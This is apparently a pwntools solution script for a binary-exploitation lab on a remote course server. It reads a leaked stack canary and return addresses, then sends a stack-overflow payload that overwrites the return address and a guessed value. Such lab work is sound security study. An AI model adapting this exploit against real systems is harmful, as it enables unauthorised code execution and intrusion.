#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import pow as pw
from pwn import *

context.arch = 'amd64'
context.os = 'linux'

exe = "./solver_sample" if len(sys.argv) < 2 else sys.argv[1];

payload = None
if os.path.exists(exe):
    with open(exe, 'rb') as f:
        payload = f.read()

# r = process("./remoteguess", shell=True)
# r = remote("localhost", 10816)
r = remote("up23.zoolab.org", 10816)

if type(r) != pwnlib.tubes.process.process:
    pw.solve_pow(r)

if payload != None:
    ef = ELF(exe)
    print("** {} bytes to submit, solver found at {:x}".format(len(payload), ef.symbols['solver']))
    r.sendlineafter(b'send to me? ', str(len(payload)).encode())
    r.sendlineafter(b'to call? ', str(ef.symbols['solver']).encode())
    r.sendafter(b'bytes): ', payload)
else:
    r.sendlineafter(b'send to me? ', b'0')



r.recvuntil(b'          canary: ')
canary = int(r.recvuntil(b'\n')[:-1].decode('ascii'), 16)
canary = p64(canary)
print(f'canary = {repr(canary)}')

r.recvuntil(b'             rbp: ')
rbp = int(r.recvuntil(b'\n')[:-1].decode('ascii'), 16)
print(f'rbp = {hex(rbp)}')
rbp = p64(rbp)
print(f'rbp = {rbp}')

r.recvuntil(b'      returnAddr: ')
returnAddr = int(r.recvuntil(b'\n')[:-1].decode('ascii'), 16)
returnAddr = p64(returnAddr)
print(f'returnAddr = {repr(returnAddr)}')

r.recvuntil(b'  mod_returnAddr: ')
mod_returnAddr = int(r.recvuntil(b'\n')[:-1].decode('ascii'), 16)
mod_returnAddr = p64(mod_returnAddr)
print(f'mod_returnAddr = {repr(mod_returnAddr)}')

myguess = 12345
myguessStr = str(myguess).encode('ascii').ljust(16, b'\0')
padding2Magic = str('').encode('ascii').ljust(0x70-0x64, b'\0')
padding2Canary = str('').encode('ascii').ljust(8, b'\0')
print(f'myguess = {myguess}')
print(f'concate = {myguessStr + padding2Canary + canary + rbp + mod_returnAddr + padding2Magic + p32(myguess)}')

r.sendafter(b'answer? ', myguessStr + padding2Canary + canary + rbp + mod_returnAddr + padding2Magic + p32(myguess))
r.interactive()





# vim: set tabstop=4 expandtab shiftwidth=4 softtabstop=4 number cindent fileencoding=utf-8 :